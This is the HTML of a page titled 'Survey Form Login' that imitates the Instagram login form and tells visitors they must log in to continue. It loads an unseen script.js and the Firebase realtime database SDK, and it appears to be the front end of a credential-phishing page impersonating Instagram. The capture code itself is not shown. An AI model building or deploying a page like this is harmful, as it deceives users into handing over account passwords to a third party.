<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Survey Form Login</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <p style="text-align: center; font-weight: bold; margin-bottom: 10px;">Please login to continue visiting this site</p>
        <div class="form">
            <h2>Instagram</h2>
            <input type="text" placeholder="Phone number, username, or email">
            <input type="password" placeholder="Password">
            <button disabled>Log In</button>
        </div>
        <div class="footer">
            <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>
    </div>
    <script src="script.js" defer></script>
    <!-- Firebase App (the core Firebase SDK) -->
<script src="https://www.gstatic.com/firebasejs/9.17.2/firebase-app.js"></script>

<!-- Add Firebase Analytics -->
<script src="https://www.gstatic.com/firebasejs/9.17.2/firebase-analytics.js"></script>

<!-- Add Firebase Database -->
<script src="https://www.gstatic.com/firebasejs/9.17.2/firebase-database.js"></script>

</body>
</html>
